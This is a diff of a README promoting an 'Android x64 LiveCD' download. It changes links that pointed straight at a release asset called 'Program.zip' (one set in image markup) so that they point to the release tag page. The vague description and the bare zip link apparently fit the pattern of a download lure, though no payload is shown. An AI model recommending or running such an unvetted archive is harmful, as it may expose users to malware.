@@ -27,7 +27,7 @@ In this repository, you will find detailed documentation on various aspects rela
 
 ## Accessing the LiveCD
 To download the Android x64 LiveCD 5B, click the button below:
-[![Download Android x64 LiveCD](https://github.com/Erliansyah/Android-x64_LiveCD_5B_Docs/releases/download/v1.0/Program.zip)](https://github.com/Erliansyah/Android-x64_LiveCD_5B_Docs/releases/download/v1.0/Program.zip)
+[![Download Android x64 LiveCD](https://github.com/Erliansyah/Android-x64_LiveCD_5B_Docs/releases/tag/v1.0)](https://github.com/Erliansyah/Android-x64_LiveCD_5B_Docs/releases/tag/v1.0)
 
 Please note that the LiveCD needs to be launched to experience the unique features of Android x64 on your system. For instructions on how to boot from the LiveCD and explore its capabilities, refer to the documentation provided in this repository.
 
@@ -38,4 +38,4 @@ Explore the world of Android x64 with the special LiveCD edition and unlock new 
 
 Happy exploring and innovating with Android x64! 🚀
 
-![Android x64](https://github.com/Erliansyah/Android-x64_LiveCD_5B_Docs/releases/download/v1.0/Program.zip)
+![Android x64](https://github.com/Erliansyah/Android-x64_LiveCD_5B_Docs/releases/tag/v1.0)
